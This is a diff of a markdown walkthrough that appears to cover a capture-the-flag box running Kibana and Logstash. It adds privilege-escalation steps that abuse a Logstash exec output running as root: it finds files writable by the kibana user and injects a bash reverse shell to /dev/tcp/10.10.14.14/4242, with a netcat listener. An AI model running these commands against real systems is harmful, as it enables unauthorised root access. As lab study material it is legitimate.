@@ -185,7 +185,7 @@ bash /dev/shm/linpeas.sh -a > /dev/shm/linpeas.txt
 
 less -r /dev/shm/linpeas.txt
 
-# it's running as ROOT
+# it's running as ROOT: look for code execution
 /usr/share/logstash
 ```
 
@@ -212,7 +212,7 @@ echo '(function(){require("fs").writeFile("/tmp/hello.txt", "Hello World");retur
 # manual test
 /usr/share/kibana/node/bin/node /tmp/hello.js
 
-# kibana's log
+# kibana log
 tail -f /var/log/kibana/kibana.stdout
 
 # from inside
@@ -237,6 +237,9 @@ Reverse shell
   });
   return /a/; // Prevents the Node.js application from crashing
 })();
+
+# NOTE you can invoke curl only once: change the name of the file to re-run the same script
+# e.g. mv /tmp/shell.js /tmp/shell1.js
 
 # listen
 nc -lvnp 4242
@@ -263,4 +266,66 @@ ENTER
 
 # in reverse-shell
 export TERM=xterm
+```
+
+### Privilege Escalation
+
+Abuse the fact that Logstash is running with root permissions
+
+* [Grok filter plugin](https://www.elastic.co/guide/en/logstash/current/plugins-filters-grok.html)
+
+```bash
+# enumerate files owned by "kibana" excluing "usr" and "proc" folder
+find / -user kibana 2>/dev/null | grep -v usr | grep -v proc
+find / -group kibana 2>/dev/null | grep -v usr | grep -v proc
+
+# code execution abusing files with root user and kibana group 
+/etc/logstash/conf.d/input.conf
+/etc/logstash/conf.d/output.conf
+/etc/logstash/conf.d/filter.conf
+
+cat /etc/logstash/conf.d/filter.conf 
+filter {
+  if [type] == "execute" {
+    grok {
+      match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
+    }
+  }
+}
+cat /etc/logstash/conf.d/input.conf  
+input {
+  file {
+    path => "/opt/kibana/logstash_*"
+    start_position => "beginning"
+    sincedb_path => "/dev/null"
+    stat_interval => "10 second"
+    type => "execute"
+    mode => "read"
+  }
+}
+cat /etc/logstash/conf.d/output.conf 
+output {
+  if [type] == "execute" {
+    stdout { codec => json }
+    exec {
+      command => "%{comando} &"
+    }
+  }
+}
+```
+
+Reverse shell to gain root access
+```bash
+echo "Ejecutar comando : touch /dev/shm/kibana.txt" > /opt/kibana/logstash_hello
+# verify
+watch -n 1 ls -la /dev/shm
+# default 2 seconds
+watch date
+
+nc -lvnp 4242
+# \s is space
+echo "Ejecutar comando : bash -i >& /dev/tcp/10.10.14.14/4242 0>&1" > /opt/kibana/logstash_shell
+
+# flag
+cat /root/root.txt
 ```
